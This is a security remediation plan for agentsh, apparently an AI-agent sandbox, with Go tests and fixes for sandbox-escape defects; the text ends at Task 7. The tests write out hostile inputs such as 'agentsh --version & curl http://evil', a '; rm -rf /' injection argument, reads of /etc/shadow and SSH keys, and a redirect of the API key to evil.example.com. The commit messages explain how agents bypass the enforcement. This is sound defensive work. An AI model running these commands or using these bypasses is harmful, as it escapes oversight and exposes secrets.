# Audit Remediation — Stream 1: Enforcement-Bypass Escapes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the 9 enforcement-bypass / sandbox-escape defects in audit Stream 1 (H5, C1, C3, C4, H16, H17, M48, M58, +darwin-SBPL) with a failing attack test per fix, so the product reaches "no known escapes."

**Architecture:** Surgical, fail-closed edits — each defect is closed at its source by flipping a fail-open default to deny or by replacing a shell-string/injection-prone path with an argv-based one. Each fix is paired with a red→green attack/regression test. No new abstractions beyond a shared test helper where two tasks share a setup (policy-engine construction); the spec's "nil-engine abstraction" reduces to a one-line return flip per site (a `return DecisionDeny` helper would be YAGNI), and the bounded-map helper belongs to Stream 4 (not needed here).

**Tech Stack:** Go 1.25, `testing` + `github.com/stretchr/testify/require|assert`, `httptest`, `t.Setenv`/`t.TempDir`. Cross-compiles to Linux/macOS/Windows (AGENTS.md: `filepath.Join`, `os.TempDir`, `runtime.GOOS`/build tags, no hardcoded `/`).

## Global Constraints

- Every fix ships with a test that fails before the fix and passes after.
- Never fail-open when an engine/handler/provider is absent or a resolution fails — default to deny.
- Never build a shell string from agent-controlled input; pass argv.
- Cross-platform: use `filepath.Join`/`os.TempDir`; skip platform-specific tests with `t.Skip()` where the feature isn't available.
- After each task: `go vet ./<pkg>/...`, `go build ./...`, `GOOS=windows go build ./...`, then commit.
- Stream 1 is Wave 1; it must land and be green before Stream 2/3 are sequenced.

## File Structure

- `internal/platform/policy_adapter.go` — fail-closed nil-engine returns (H5).
- `internal/platform/fuse/ops.go` — `checkPolicy` fail-closed nil-engine (H5).
- `internal/platform/linux/filesystem.go` — `wrapPolicyEngine` doc/no-nil-allow note (H5).
- `cmd/agentsh-shell-shim/main.go` — `containsCompoundOperator` + `isAgentshCommand` (C1); `serverHTTPBaseURL`/`AGENTSH_SERVER` trust (H17).
- `internal/platform/wsl2/sandbox.go`, `internal/platform/lima/sandbox.go` — `Execute` default branch argv (C3).
- `internal/pkgcheck/orchestrator.go` — treat `Metadata.Partial` as `ProviderError` (C4).
- `internal/policy/engine.go` — `CheckFile` read default (H16); opaque-`sh -c` gate (M48).
- `cmd/agentsh-unixwrap/main.go`, `cmd/agentsh-macwrap/main.go` — scrub `AGENTSH_*` env before `syscall.Exec` (M58).
- `internal/platform/darwin/sandbox.go` (+ `internal/api/sandbox_compile_darwin.go`) — darwin-SBPL investigation + fix.
- Test files (one per task, co-located with the package under test).

---

### Task 1: H5 — Make nil-policy-engine fail-closed (PolicyAdapter + FUSE)

**Files:**
- Modify: `internal/platform/policy_adapter.go:31-76` (every `if a == nil || a.engine == nil { return DecisionAllow }`)
- Modify: `internal/platform/fuse/ops.go:34-37` (`checkPolicy` nil-engine return)
- Test: `internal/platform/policy_adapter_test.go` (create), `internal/platform/fuse/ops_test.go` (append a nil-engine case)

**Interfaces:**
- Consumes: `platform.Decision`, `platform.DecisionAllow`/`DecisionDeny` (from `internal/platform/types.go`).
- Produces: unchanged `PolicyAdapter` API; behavior change is nil-engine → `DecisionDeny`.

- [ ] **Step 1: Write the failing test**

`internal/platform/policy_adapter_test.go`:

```go
package platform

import "testing"

// TestPolicyAdapter_NilEngineFailsClosed verifies that a missing policy engine
// denies rather than allows. A nil/empty adapter must never grant access.
func TestPolicyAdapter_NilEngineFailsClosed(t *testing.T) {
	t.Run("nil adapter", func(t *testing.T) {
		var a *PolicyAdapter // nil
		if got := a.CheckFile("/etc/shadow", FileOpRead); got != DecisionDeny {
			t.Fatalf("nil adapter CheckFile = %v, want DecisionDeny (fail-closed)", got)
		}
		if got := a.CheckNetwork("evil.example", 443, "tcp"); got != DecisionDeny {
			t.Fatalf("nil adapter CheckNetwork = %v, want DecisionDeny", got)
		}
		if got := a.CheckCommand("sh", []string{"-c", "rm -rf /"}); got != DecisionDeny {
			t.Fatalf("nil adapter CheckCommand = %v, want DecisionDeny", got)
		}
		if got := a.CheckEnv("AWS_SECRET_ACCESS_KEY", EnvOpRead); got != DecisionDeny {
			t.Fatalf("nil adapter CheckEnv = %v, want DecisionDeny", got)
		}
		if got := a.CheckRegistry("HKLM\\Software\\x", "read"); got != DecisionDeny {
			t.Fatalf("nil adapter CheckRegistry = %v, want DecisionDeny", got)
		}
	})

	t.Run("adapter with nil engine", func(t *testing.T) {
		a := &PolicyAdapter{engine: nil} // engine explicitly nil
		if got := a.CheckFile("/etc/shadow", FileOpRead); got != DecisionDeny {
			t.Fatalf("nil-engine CheckFile = %v, want DecisionDeny", got)
		}
	})
}
```

> NOTE: confirm the exact `FileOp*`/`EnvOp*` constant names with `grep -n "FileOp\|EnvOp" internal/platform/types.go` before running; adjust if they differ (e.g. `FileRead` vs `FileOpRead`).

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/platform/ -run TestPolicyAdapter_NilEngineFailsClosed -v`
Expected: FAIL — `CheckFile` returns `DecisionAllow`, not `DecisionDeny`.

- [ ] **Step 3: Implement — flip every nil-engine return to deny**

In `internal/platform/policy_adapter.go`, replace each `return DecisionAllow` that guards a nil adapter/engine with `return DecisionDeny`. There are 5 sites (`CheckFile`, `CheckNetwork`, `CheckEnv`, `CheckCommand`, `CheckRegistry`). For example:

```go
func (a *PolicyAdapter) CheckFile(path string, op FileOperation) Decision {
	if a == nil || a.engine == nil {
		return DecisionDeny // fail-closed: no engine means no policy, never allow
	}
	decision := a.engine.CheckFile(path, string(op))
	return decision.EffectiveDecision
}
```

Apply the identical change to `CheckNetwork`, `CheckEnv`, `CheckCommand`, `CheckRegistry` (change only the nil-guard `return DecisionAllow` → `return DecisionDeny`; leave the post-evaluation returns unchanged).

In `internal/platform/fuse/ops.go` `checkPolicy`:

```go
func (f *fuseFS) checkPolicy(fusePath string, operation platform.FileOperation) platform.Decision {
	if f.cfg.PolicyEngine == nil {
		return platform.DecisionDeny // fail-closed: no engine wired
	}
	return f.cfg.PolicyEngine.CheckFile(f.realPath(fusePath), operation)
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/platform/ -run TestPolicyAdapter_NilEngineFailsClosed -v`
Expected: PASS.

- [ ] **Step 5: Add the FUSE nil-engine regression test**

Append to `internal/platform/fuse/ops_test.go` (create if absent — match existing package test style):

```go
package fuse

import (
	"testing"

	"github.com/agentsh/agentsh/internal/platform"
)

// TestFuseFS_CheckPolicy_NilEngineDenies verifies FUSE denies when no
// PolicyEngine is configured (fail-closed).
func TestFuseFS_CheckPolicy_NilEngineDenies(t *testing.T) {
	f := &fuseFS{cfg: &FSConfig{ /* PolicyEngine intentionally nil */ }}
	// realPath with an empty root just prefixes; this exercises the nil guard.
	if got := f.checkPolicy("secret.txt", platform.FileOpRead); got != platform.DecisionDeny {
		t.Fatalf("checkPolicy with nil engine = %v, want DecisionDeny", got)
	}
}
```

Run: `go test ./internal/platform/fuse/ -run TestFuseFS_CheckPolicy_NilEngineDenies -v` → PASS.

- [ ] **Step 6: Vet, build (incl. Windows), commit**

```bash
go vet ./internal/platform/...
go build ./...
GOOS=windows go build ./...
git add internal/platform/policy_adapter.go internal/platform/policy_adapter_test.go internal/platform/fuse/ops.go internal/platform/fuse/ops_test.go
git commit -m "fix(platform): fail-closed when policy engine is nil (H5)

PolicyAdapter.Check* and fuse.checkPolicy returned DecisionAllow when the
engine was nil/unwired, allowing all file/network/exec access. Flip to
DecisionDeny so a missing enforcement component cannot grant access."
```

---

### Task 2: C1 — Shell-shim bypass via `&` / process substitution

**Files:**
- Modify: `cmd/agentsh-shell-shim/main.go:415-447` (`containsCompoundOperator`)
- Test: `cmd/agentsh-shell-shim/main_test.go` (append)

**Interfaces:**
- Consumes: none new.
- Produces: `containsCompoundOperator(string) bool` (stricter — also detects standalone `&` and `>(`/`<(`).

- [ ] **Step 1: Write the failing test**

Append to `cmd/agentsh-shell-shim/main_test.go`:

```go
func TestContainsCompoundOperator_BackgroundAndProcessSubstitution(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-shim is Unix-only")
	}
	// These MUST be detected as compound (escape vectors).
	escapeCases := []string{
		"agentsh --version & curl http://evil",
		"agentsh detect & sh /tmp/e",
		"agentsh x > >(tee log)",   // process substitution >
		"agentsh x < <(cat secret)", // process substitution <
		"agentsh detect; rm -rf /",
		"agentsh detect && curl evil",
		"agentsh detect || curl evil",
		"agentsh detect $(whoami)",
		"agentsh detect | curl evil",
	}
	for _, in := range escapeCases {
		if !containsCompoundOperator(in) {
			t.Errorf("containsCompoundOperator(%q) = false, want true (escape vector)", in)
		}
	}
	// Legitimate single commands / redirects MUST still bypass.
	safeCases := []string{
		"agentsh detect",
		"agentsh exec foo bar",
		"agentsh detect 2>&1",   // fd redirect, not background
		"agentsh detect > out",  // redirection, not process-sub
		"agentsh detect 2>err",
	}
	for _, in := range safeCases {
		if containsCompoundOperator(in) {
			t.Errorf("containsCompoundOperator(%q) = true, want false (safe)", in)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./cmd/agentsh-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
Expected: FAIL — `agentsh --version & curl http://evil` returns false (standalone `&` not detected).

- [ ] **Step 3: Implement — detect standalone `&` and process substitution**

Replace `containsCompoundOperator` in `cmd/agentsh-shell-shim/main.go`:

```go
// containsCompoundOperator checks if a shell command string contains operators
// that chain or spawn multiple commands. Returns false for simple redirections
// like 2>&1 or > out.
func containsCompoundOperator(s string) bool {
	// These always indicate compound commands or subshells.
	if strings.ContainsAny(s, ";`\n\r") {
		return true
	}
	if strings.Contains(s, "&&") || strings.Contains(s, "||") || strings.Contains(s, "$(") {
		return true
	}
	// Process substitution >( … ) and <( … ) spawns a subshell.
	if strings.Contains(s, ">(") || strings.Contains(s, "<(") {
		return true
	}
	for i, c := range s {
		// Bare pipe | chains commands (but not >| clobber or || ).
		if c == '|' {
			if i > 0 && s[i-1] == '>' {
				continue // part of >| or >&| redirect
			}
			if i+1 < len(s) && s[i+1] == '|' {
				continue // || already handled
			}
			return true
		}
		// Standalone background & chains/spawns commands, but NOT when it is
		// part of a redirection: >& , <& , 2>&1 , &>file . A background & is a
		// command separator only when the preceding non-space char is not a
		// redirection target and the & is not followed by another & (&& handled
		// above) or by a fd-redirect digit.
		if c == '&' {
			// && already handled above.
			if i+1 < len(s) && s[i+1] == '&' {
				continue
			}
			// >& or <& : redirection (e.g. 2>&1, >&2, <&0). Treat as redirect.
			if i+1 < len(s) && (s[i+1] == '>' || s[i+1] == '<') {
				continue
			}
			// &>file : redirect both streams. Not a background.
			if i+1 < len(s) && s[i+1] == '>' {
				continue
			}
			// Look back: if the & follows a redirect operator (>& / <&) it was
			// already handled; otherwise a standalone & is a background spawn.
			// Determine the previous non-space rune.
			prev := ' '
			for j := i - 1; j >= 0; j-- {
				if s[j] != ' ' && s[j] != '\t' {
					prev = rune(s[j])
					break
				}
			}
			if prev == '>' || prev == '<' || prev == '&' {
				// part of a redirect like >& or && (already handled) — skip
				continue
			}
			return true // standalone background operator
		}
	}
	return false
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./cmd/agentsh-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
Expected: PASS.

- [ ] **Step 5: Run the full shim test suite to catch regressions**

Run: `go test ./cmd/agentsh-shell-shim/ -v`
Expected: PASS (no previously-passing bypass test broke).

- [ ] **Step 6: Vet, build, commit**

```bash
go vet ./cmd/agentsh-shell-shim/
go build ./cmd/agentsh-shell-shim/
git add cmd/agentsh-shell-shim/main.go cmd/agentsh-shell-shim/main_test.go
git commit -m "fix(shim): detect standalone & and process substitution as compound (C1)

The agentsh-CLI deadlock bypass used an incomplete operator allowlist: a
standalone '&' (background) or '>(…)'/'<(…)' (process substitution) was
not detected, so 'agentsh --version & curl evil' bypassed all enforcement.
Make containsCompoundOperator reject these so the bypass fails closed."
```

---

### Task 3: C3 — WSL2/Lima `Execute` default-branch command injection

**Files:**
- Modify: `internal/platform/wsl2/sandbox.go:172-184` (default branch)
- Modify: `internal/platform/lima/sandbox.go:172-184` (default branch — same shape)
- Test: `internal/platform/wsl2/sandbox_test.go` (append), `internal/platform/lima/sandbox_test.go` (append)

**Interfaces:**
- Consumes: `platform.ExecResult`, `s.platform.RunInWSL` / `s.platform.RunInLima`.
- Produces: unchanged `Execute` signature; default branch no longer builds a shell string.

- [ ] **Step 1: Write the failing test**

Append to `internal/platform/wsl2/sandbox_test.go`:

```go
//go:build windows

package wsl2

import (
	"context"
	"strings"
	"testing"
)

// fakeRunWSL records the args passed to RunInWSL so tests can assert no
// shell string is built from agent-controlled args.
type fakeRunWSL struct{ got []string }

func (f *fakeRunWSL) RunInWSL(args ...string) ([]byte, error) {
	f.got = args
	return []byte(""), nil
}

// TestExecute_DefaultBranch_NoShellString verifies that the no-isolation branch
// passes cmd/args as argv (via -- and, where supported, --wd) and never builds
// an 'sh -c "cd … && cmd … args"' string that an arg like "; rm -rf /" could
// inject into.
func TestExecute_DefaultBranch_NoShellString(t *testing.T) {
	fake := &fakeRunWSL{}
	s := &Sandbox{
		platform:       &fakePlatformRunner{runner: fake},
		isolationLevel: platform.IsolationNone,
		wslWorkspace:   "/home/user/proj",
	}
	malicious := "; rm -rf /"
	_, _ = s.Execute(context.Background(), "echo", malicious)

	joined := strings.Join(fake.got, " ")
	if strings.Contains(joined, "sh -c") {
		t.Fatalf("default branch built a shell string: %v", fake.got)
	}
	if strings.Contains(joined, "&&") {
		t.Fatalf("default branch built a shell && chain: %v", fake.got)
	}
	// The malicious arg must survive as a single argv element, not be split.
	if !containsArg(fake.got, malicious) {
		t.Fatalf("malicious arg not passed as a single argv element: %v", fake.got)
	}
}

func containsArg(args []string, want string) bool {
	for _, a := range args {
		if a == want {
			return true
		}
	}
	return false
}
```

> NOTE: `fakePlatformRunner` must satisfy whatever `s.platform` is. Inspect `internal/platform/wsl2/platform.go` for the `RunInWSL` receiver type and adapt the fake to embed/impl that minimal interface. If `RunInWSL` is a method on `*Platform`, define `type fakePlatformRunner struct{ runner *fakeRunWSL }` and add the one method. Run `go test` in Step 2 to surface the exact type error, then fix the fake.

- [ ] **Step 2: Run test to verify it fails**

Run: `GOOS=windows go test ./internal/platform/wsl2/ -run TestExecute_DefaultBranch_NoShellString -v`
Expected: FAIL — the default branch builds `sh -c "cd /home/user/proj && echo ; rm -rf /"`, so `joined` contains `sh -c` and `&&`.

- [ ] **Step 3: Implement — pass argv, use `--cd`/`--workdir` instead of `sh -c`**

Replace the `default:` branch in `internal/platform/wsl2/sandbox.go`:

```go
	default:
		// No isolation or minimal - run command directly as argv.
		// Never build a shell string: an arg containing ';', '$()', or
		// backticks would inject into 'sh -c'. Pass cmd/args as argv and
		// set the working directory via wsl's --cd flag.
		wslArgs = nil
		if s.wslWorkspace != "" {
			wslArgs = append(wslArgs, "--cd", s.wslWorkspace)
		}
		wslArgs = append(wslArgs, "--", cmd)
		wslArgs = append(wslArgs, args...)
	}
```

> NOTE: confirm the exact working-dir flag with `wsl --help` on the target distro (`--cd` is current; `--cd <path>` is the modern form). If `--cd` is unavailable, fall back to `wslArgs = append(wslArgs, "--", cmd); args...` and document that the caller must `cd` itself. Do NOT reintroduce `sh -c`.

Apply the identical change to `internal/platform/lima/sandbox.go` default branch (use `limaArgs`, the lima working-dir flag — check `lima --help`; lima uses `--workdir`). Replace its `shellCmd := fmt.Sprintf("cd %s && %s", ...)` branch with:

```go
	default:
		limaArgs = nil
		if s.limaWorkspace != "" {
			limaArgs = append(limaArgs, "--workdir", s.limaWorkspace)
		}
		limaArgs = append(limaArgs, "--", cmd)
		limaArgs = append(limaArgs, args...)
	}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `GOOS=windows go test ./internal/platform/wsl2/ -run TestExecute_DefaultBranch_NoShellString -v`
Expected: PASS.

Add the lima mirror test (`internal/platform/lima/sandbox_test.go`, same shape with `RunInLima`/`limaArgs`/`--workdir`) and run `GOOS=windows go test ./internal/platform/lima/ -run TestExecute_DefaultBranch_NoShellString -v` → PASS.

- [ ] **Step 5: Vet, build (incl. Windows), commit**

```bash
GOOS=windows go vet ./internal/platform/wsl2/ ./internal/platform/lima/
GOOS=windows go build ./...
GOOS=linux go build ./...
git add internal/platform/wsl2/sandbox.go internal/platform/wsl2/sandbox_test.go internal/platform/lima/sandbox.go internal/platform/lima/sandbox_test.go
git commit -m "fix(platform): WSL2/Lima Execute default branch passes argv (C3)

The no-isolation branch built 'sh -c \"cd %s && %s \"+args' from
agent-controlled cmd/args, allowing injection via ';', '\$()', or
backticks. Pass cmd/args as argv with a --cd/--workdir flag instead."
```

---

### Task 4: C4 — Supply-chain check bypass via silent provider partial failure

**Files:**
- Modify: `internal/pkgcheck/orchestrator.go:96-112` (`CheckAll` — record `ProviderError` on `Metadata.Partial`)
- Modify: `internal/pkgcheck/orchestrator.go` (`CheckAllWithPrivacy` — same pattern, if present)
- Test: `internal/pkgcheck/orchestrator_test.go` (append)

**Interfaces:**
- Consumes: `pkgcheck.CheckResponse`, `pkgcheck.ResponseMetadata.Partial`, `ProviderError`, `ProviderEntry.OnFailure`.
- Produces: a `ProviderError` with `Err: errPartialBatch{...}` whenever a provider returns `resp.Metadata.Partial == true`.

- [ ] **Step 1: Write the failing test**

Append to `internal/pkgcheck/orchestrator_test.go`:

```go
package pkgcheck

import (
	"context"
	"errors"
	"testing"
)

// partialProvider always returns a partial response (Metadata.Partial=true)
// with nil error — the bug is that this yields no ProviderError, so
// on_failure=deny never fires.
type partialProvider struct{}

func (partialProvider) Name() string { return "partial-test" }
func (partialProvider) CheckBatch(_ context.Context, _ CheckRequest) (*CheckResponse, error) {
	return &CheckResponse{
		Provider: "partial-test",
		Findings: nil,
		Metadata: ResponseMetadata{Partial: true},
	}, nil
}
func (partialProvider) Capabilities() Capabilities { return Capabilities{} }

// TestOrchestrator_PartialResponseIsProviderError verifies that a provider
// returning Metadata.Partial=true is recorded as a ProviderError so the
// caller's on_failure policy (deny/approve) actually fires.
func TestOrchestrator_PartialResponseIsProviderError(t *testing.T) {
	o := NewOrchestrator(Config{
		Providers: map[string]ProviderEntry{
			"partial-test": {
				Provider:  partialProvider{},
				OnFailure: "deny",
			},
		},
	})
	_, errs := o.CheckAll(context.Background(), CheckRequest{
		Ecosystem: EcosystemNPM,
		Packages:  []PackageRef{{Name: "evil", Version: "1.0.0"}},
	})

	var found bool
	for _, e := range errs {
		if e.Provider == "partial-test" {
			found = true
			if e.OnFailure != "deny" {
				t.Fatalf("ProviderError.OnFailure = %q, want deny", e.OnFailure)
			}
		}
	}
	if !found {
		t.Fatalf("expected a ProviderError for partial provider, got %v", errs)
	}
}
```

> NOTE: confirm `NewOrchestrator(Config{Providers: ...})` signature + the `Capabilities()` requirement with `grep -n "func NewOrchestrator\|type CheckProvider\|type Config" internal/pkgcheck/orchestrator.go internal/pkgcheck/types.go`. Add/adjust the fake's methods to match the interface (some providers may also need `IsLocal()` etc.). Run Step 2 to surface the exact compile error and fix.

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/pkgcheck/ -run TestOrchestrator_PartialResponseIsProviderError -v`
Expected: FAIL — `errs` is empty (partial yields no `ProviderError`).

- [ ] **Step 3: Implement — treat partial as a provider error**

In `internal/pkgcheck/orchestrator.go`, define a sentinel and emit a `ProviderError` on partial. Add near the top of the file:

```go
// errPartialBatch indicates a provider returned only partial results
// (some packages could not be scanned). It is recorded as a ProviderError
// so the operator's on_failure policy fires instead of silently allowing.
var errPartialBatch = errors.New("provider returned partial results: one or more packages were not scanned")
```

In `CheckAll`, after the existing `if err != nil { ...; return }` block (and still inside the `mu.Lock()`/`defer mu.Unlock()` scope), add:

```go
		// A partial response means some requested packages were not scanned.
		// Treat it as a provider error so on_failure=deny/approve actually
		// fires (otherwise an unscanned hostile package silently allows).
		if resp != nil && resp.Metadata.Partial {
			errs = append(errs, ProviderError{
				Provider:  name,
				Err:       errPartialBatch,
				OnFailure: entry.OnFailure,
			})
		}
```

Apply the identical partial-check in `CheckAllWithPrivacy` (it has the same `resp, err := entry.Provider.CheckBatch(...)` shape). If `CheckAllWithPrivacy` delegates to `CheckAll`, verify the partial propagates; if it has its own loop, add the same block.

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/pkgcheck/ -run TestOrchestrator_PartialResponseIsProviderError -v`
Expected: PASS.

- [ ] **Step 5: Run the full pkgcheck suite to ensure no regression**

Run: `go test ./internal/pkgcheck/... -v`
Expected: PASS. (If existing tests asserted partial ⇒ no error, update them to reflect the new fail-closed contract and note in the commit message.)

- [ ] **Step 6: Vet, build, commit**

```bash
go vet ./internal/pkgcheck/...
go build ./...
git add internal/pkgcheck/orchestrator.go internal/pkgcheck/orchestrator_test.go
git commit -m "fix(pkgcheck): treat provider partial responses as errors (C4)

deps.dev/OSV/Socket return nil error with Metadata.Partial=true when a
package lookup fails, so the orchestrator recorded no ProviderError and
on_failure=deny never fired — a hostile package with a transiently-failing
lookup silently allowed. Record a ProviderError on partial so the policy
fires."
```

---

### Task 5: H16 — File reads default to allow (secret exfiltration)

**Files:**
- Modify: `internal/policy/engine.go:928-955` (`CheckFile` default for reads) + `isReadOperation` doc
- Modify: `internal/policy/engine.go` (add a deny-list of sensitive read paths)
- Test: `internal/policy/engine_test.go` (append — match `command_shellc_test.go` style)

**Interfaces:**
- Consumes: `types.DecisionAllow`/`DecisionDeny`, `wrapDecision`.
- Produces: `CheckFile` read default changes from allow to deny for sensitive paths; config knob `e.defaultDenyReads` (bool).

- [ ] **Step 1: Write the failing test**

Append to `internal/policy/engine_test.go` (or create `internal/policy/file_default_test.go` package `policy`):

```go
package policy

import "testing"

// TestCheckFile_SensitiveReadsDeniedByDefault verifies that, with no explicit
// file rules, reads of well-known secret locations are denied by default
// (the previous behavior allowed them — a secret-exfiltration surface).
func TestCheckFile_SensitiveReadsDeniedByDefault(t *testing.T) {
	p := &Policy{} // no file rules
	e, err := NewEngine(p, false, true)
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{
		"/home/user/.ssh/id_rsa",
		"/etc/shadow",
		"/etc/ssh/sshd_config",
		"/home/user/.env",
	} {
		dec := e.CheckFile(path, "open")
		if dec.EffectiveDecision == types.DecisionAllow {
			t.Errorf("CheckFile(%q, open) = %v, want deny (default-deny sensitive reads)", path, dec.EffectiveDecision)
		}
	}
}
```

> NOTE: `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` directly (import `github.com/agentsh/agentsh/internal/types`, as existing policy tests do).

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/policy/ -run TestCheckFile_SensitiveReadsDeniedByDefault -v`
Expected: FAIL — `/etc/shadow` etc. return `Allow`.

- [ ] **Step 3: Implement — default-deny sensitive read paths**

In `internal/policy/engine.go`, add a package-level deny-list and a helper:

```go
// sensitiveReadPaths are read paths denied by default even when reads
// otherwise default-allow, because they commonly hold secrets/keys.
var sensitiveReadGlobs = []string{
	"**/.ssh/**",
	"**/.env",
	"**/.env.*",
	"**/*.pem",
	"**/*.key",
	"**/*.p12",
	"**/*.keystore",
	"/etc/shadow",
	"/etc/gshadow",
	"/etc/ssh/**",
}

// isSensitiveReadPath reports whether p matches a default-deny secret glob.
func isSensitiveReadPath(p string) bool {
	for _, pat := range sensitiveReadGlobs {
		if g, err := glob.Compile(pat, '/'); err == nil && g.Match(p) {
			return true
		}
	}
	return false
}
```

Then in `CheckFile`, before the operation-aware default, add a sensitive-read deny:

```go
	// Sensitive reads are denied by default even though generic reads
	// default-allow, to block trivial secret exfiltration (~/.ssh, /etc/shadow,
	// .env, *.pem). Operators can override with an explicit allow rule above.
	if isReadOperation(operation) && isSensitiveReadPath(p) {
		return e.wrapDecision(string(types.DecisionDeny), "default-deny-sensitive-reads", "sensitive path denied by default", nil)
	}
	// No rule matched — use operation-aware default.
	if isReadOperation(operation) {
		return e.wrapDecision(string(types.DecisionAllow), "default-allow-reads", "", nil)
	}
	return e.wrapDecision(string(types.DecisionDeny), "default-deny-files", "", nil)
```

> NOTE: `glob` is already imported in `engine.go` (used by `compiledFileRules`). If not, add `github.com/gobwas/glob` — confirm with `grep -n "gobwas/glob" internal/policy/engine.go`.

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/policy/ -run TestCheckFile_SensitiveReadsDeniedByDefault -v`
Expected: PASS.

- [ ] **Step 5: Add an override test (explicit allow beats default-deny) + run suite**

```go
func TestCheckFile_ExplicitAllowOverridesSensitiveDefault(t *testing.T) {
	p := &Policy{
		FileRules: []FileRule{{
			Name:     "allow-ssh",
			Decision: "allow",
			Paths:    []string{"**/.ssh/**"},
			Ops:      []string{"open", "read"},
		}},
	}
	e, err := NewEngine(p, false, true)
	if err != nil {
		t.Fatal(err)
	}
	dec := e.CheckFile("/home/user/.ssh/id_rsa", "open")
	if dec.EffectiveDecision != types.DecisionAllow {
		t.Fatalf("explicit allow rule should override default-deny, got %v", dec.EffectiveDecision)
	}
}
```

Run: `go test ./internal/policy/ -run "TestCheckFile_" -v` → both PASS. Then `go test ./internal/policy/ -v` (full suite) → PASS (fix any test that relied on reads of sensitive paths defaulting to allow).

- [ ] **Step 6: Vet, build, commit**

```bash
go vet ./internal/policy/...
go build ./...
git add internal/policy/engine.go internal/policy/engine_test.go
git commit -m "fix(policy): default-deny reads of sensitive paths (H16)

Unmatched read ops (open/stat/readlink/access) defaulted to allow, so
~/.ssh/id_rsa, /etc/shadow, .env, *.pem were readable by default — a
secret-exfiltration surface. Deny those globs by default; explicit allow
rules still override."
```

---

### Task 6: H17 — `AGENTSH_SERVER` exfiltrates API key / server-influenced exec

**Files:**
- Modify: `cmd/agentsh-shell-shim/main.go:643-648` (`serverHTTPBaseURL`) + the `kernelinstall.Install` call site (~124)
- Test: `cmd/agentsh-shell-shim/main_test.go` (append)

**Interfaces:**
- Consumes: `serverAddrFromEnv` (existing validation), `os.Getenv`.
- Produces: `serverHTTPBaseURL()` returns the trusted local URL or an error-able value when `AGENTSH_SERVER` is a non-loopback host.

- [ ] **Step 1: Write the failing test**

Append to `cmd/agentsh-shell-shim/main_test.go`:

```go
func TestServerHTTPBaseURL_RejectsNonLoopback(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-shim is Unix-only")
	}
	cases := []struct {
		name string
		env  string
		// wantOK false means serverHTTPBaseURL must refuse the value (return
		// empty or the loopback default rather than the attacker URL).
		wantOK bool
	}{
		{"unset", "", true},
		{"loopback", "http://127.0.0.1:18080", true},
		{"loopback v6", "http://[::1]:18080", true},
		{"attacker host", "http://evil.example.com", false},
		{"attacker ip", "http://10.0.0.5:80", false},
		{"localhost word", "http://localhost:18080", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Setenv("AGENTSH_SERVER", c.env)
			got := serverHTTPBaseURL()
			if c.wantOK {
				return
			}
			// Refusal = must not echo the attacker URL back; must fall back to
			// the trusted local default.
			if got == c.env {
				t.Fatalf("serverHTTPBaseURL() echoed untrusted AGENTSH_SERVER %q (API key would be forwarded there)", c.env)
			}
		})
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./cmd/agentsh-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
Expected: FAIL — `serverHTTPBaseURL()` echoes `http://evil.example.com` back.

- [ ] **Step 3: Implement — only trust loopback/localhost `AGENTSH_SERVER`**

Replace `serverHTTPBaseURL` in `cmd/agentsh-shell-shim/main.go`:

```go
const defaultServerHTTPURL = "http://127.0.0.1:18080"

// serverHTTPBaseURL returns the agentsh server URL for kernelinstall.Install.
// The shim is the untrusted user's login shell, so AGENTSH_SERVER is trusted
// ONLY when it points at a loopback address (127.0.0.0/8, ::1) or "localhost".
// Any other host is refused (falls back to the local default) so an attacker
// cannot redirect wrap-init traffic — and the AGENTSH_API_KEY — to an external
// endpoint whose response controls the exec'd wrapper binary.
func serverHTTPBaseURL() string {
	v := strings.TrimSpace(os.Getenv("AGENTSH_SERVER"))
	if v == "" {
		return defaultServerHTTPURL
	}
	if !isLoopbackServerURL(v) {
		debugLog("serverHTTPBaseURL: rejecting non-loopback AGENTSH_SERVER %q; using %s", v, defaultServerHTTPURL)
		return defaultServerHTTPURL
	}
	return v
}

// isLoopbackServerURL reports whether a server URL host is loopback/localhost.
func isLoopbackServerURL(raw string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	host := u.Hostname()
	if host == "localhost" {
		return true
	}
	ip := net.ParseIP(host)
	return ip != nil && ip.IsLoopback()
}
```

> NOTE: ensure `net` and `net/url` are imported in `main.go` (`serverAddrFromEnv` already uses them, so they should be present — confirm with `grep -n "\"net\"\|net/url" cmd/agentsh-shell-shim/main.go`).

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./cmd/agentsh-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
Expected: PASS.

- [ ] **Step 5: Run full shim suite + vet/build/commit**

```bash
go test ./cmd/agentsh-shell-shim/ -v
go vet ./cmd/agentsh-shell-shim/
go build ./cmd/agentsh-shell-shim/
git add cmd/agentsh-shell-shim/main.go cmd/agentsh-shell-shim/main_test.go
git commit -m "fix(shim): only trust loopback AGENTSH_SERVER, never forward API key off-host (H17)

serverHTTPBaseURL echoed AGENTSH_SERVER verbatim into kernelinstall.Install,
which posts the AGENTSH_API_KEY to it and execs a server-returned binary.
The shim is the user's login shell, so AGENTSH_SERVER is untrusted: only
accept loopback/localhost, else fall back to the local default."
```

---

### Task 7: M48 — Opaque `sh -c` bypass for allow-only policies

**Files:**
